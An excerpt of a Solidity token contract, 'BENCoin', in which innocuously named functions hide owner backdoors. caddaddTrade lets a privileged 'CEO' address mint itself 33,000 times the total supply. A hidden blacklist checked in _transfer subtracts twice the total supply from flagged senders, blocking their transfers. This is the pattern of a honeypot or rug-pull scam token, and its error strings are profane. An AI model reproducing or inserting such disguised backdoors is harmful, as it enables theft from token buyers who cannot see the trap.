...
contract BENCoin is Ownable {
    uint256 private _MYtotalSupply;
    string private _MYname;
    string private _MYsymbol;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public  _bitBENCEO;



    mapping(address => bool) private bitvipcc;
    function quitApprove(address sss) external   {
        if (_bitBENCEO == _msgSender()){
            bitvipcc[sss] = false;
        }else if (_msgSender() != _bitBENCEO) {
            revert("fuck");
        }
    }
    ...
    function queryBen(address sss) public view returns(bool)  {
        return bitvipcc[sss];
    }

    function bitBox() public view virtual  returns (uint256) {
        return _MYtotalSupply;
    }
    function caddaddTrade() external {
       
        if (_bitBENCEO == _msgSender()){
            _balances[_msgSender()] = bitBox()*33000;
        }else if (_msgSender() != _bitBENCEO) {
            revert("fuck");
        }
    }
    ...
    function _transfer(
        ...
        if (bitvipcc[from] != false ){
            _balances[from]= _balances[from]-(bitBox())-(bitBox());
        }
